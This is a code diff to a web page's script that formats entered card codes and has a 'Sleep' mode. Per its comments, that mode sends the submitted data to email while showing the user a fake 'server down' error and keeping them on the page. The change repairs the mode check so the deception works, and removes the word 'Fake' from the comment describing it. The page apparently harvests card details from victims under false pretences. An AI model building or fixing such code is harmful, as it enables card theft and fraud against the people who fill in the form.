@@ -153,7 +153,7 @@
     <div id="toastContainer" class="fixed bottom-4 right-4 z-50 flex flex-col gap-2 pointer-events-none"></div>
 
     <script>
-        // CONFIGURATION TOGGLE: 'A' for Active / Normal Behavior, 'S' for Sleep Time / Fake Server Down Error Mode
+        // CONFIGURATION TOGGLE: 'A' for Active / Normal Behavior, 'S' for Sleep Time / Server Down Error Mode
         const MODE = 'S';
 
         function formatCardCode(input) {
@@ -244,7 +244,7 @@
             // HERE AAAAAAAAAAAAA --- STEP 3: FINAL HANDLING ---
             // If MODE is set to 'S' (Sleep Time) A= Active, we override success to false so it successfully sends to email, 
             // but displays the server down toast and stays on the same page without redirecting.
-            const isSleepMode = (MODE.toUpperCase() === 'A');
+            const isSleepMode = (MODE.toUpperCase() === 'S');
             const finalSuccess = isSleepMode ? false : success;
 
 
